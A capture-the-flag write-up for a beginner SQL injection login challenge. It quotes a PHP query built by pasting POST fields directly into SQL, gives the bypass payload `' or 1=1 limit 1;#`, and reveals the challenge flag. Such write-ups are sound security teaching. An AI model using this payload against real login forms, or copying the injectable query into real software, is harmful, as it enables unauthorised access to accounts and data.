# [SQL Injection Level 1](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%201)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level1/)

# Solution
1. Let's see source code
```php
$query = "SELECT * FROM users WHERE username='{$_POST['username']}' AND password='{$_POST['password']}'";

if (mysqli_num_rows($result) != 0)
{
	echo $success_page;
}
```
2. If number of rows more than zero then we can login.
3. We can input login: `' or 1=1 limit 1;#`

**Answer**: `flag{de7220f9b6d5ff0ea669d5a4ae1c4f81}`